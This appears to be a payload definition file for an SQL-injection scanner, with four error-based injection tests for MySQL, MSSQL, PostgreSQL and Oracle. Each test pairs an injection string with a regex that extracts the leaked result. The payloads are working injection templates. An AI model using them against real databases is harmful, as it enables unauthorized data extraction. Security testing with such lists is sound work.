<?xml version="1.0" encoding="UTF-8"?>
<root>
    <test>
        <title>MySQL Error-Based (EXTRACTVALUE)</title>
        <stype>2</stype>
        <dbms>MySQL</dbms>
        <payload>AND EXTRACTVALUE(8341,CONCAT('\','qXXq',(SELECT 1),'qYYq'))</payload>
        <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
    </test>

    <test>
        <title>MSSQL Error-Based (CONVERT)</title>
        <stype>2</stype>
        <dbms>MSSQL</dbms>
        <payload>AND 8341=CONVERT(INT,(SELECT 'qXXq'+'1'+'qYYq'))</payload>
        <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
    </test>

    <test>
        <title>PostgreSQL Error-Based (CAST)</title>
        <stype>2</stype>
        <dbms>PostgreSQL</dbms>
        <payload>AND CAST('qXXq'||(SELECT 1)||'qYYq' AS NUMERIC)=8341</payload>
        <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
    </test>

    <test>
        <title>Oracle Error-Based (UTL_INADDR)</title>
        <stype>2</stype>
        <dbms>Oracle</dbms>
        <payload>AND 8341=UTL_INADDR.GET_HOST_ADDRESS('qXXq'||(SELECT 1 FROM DUAL)||'qYYq')</payload>
        <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
    </test>
</root>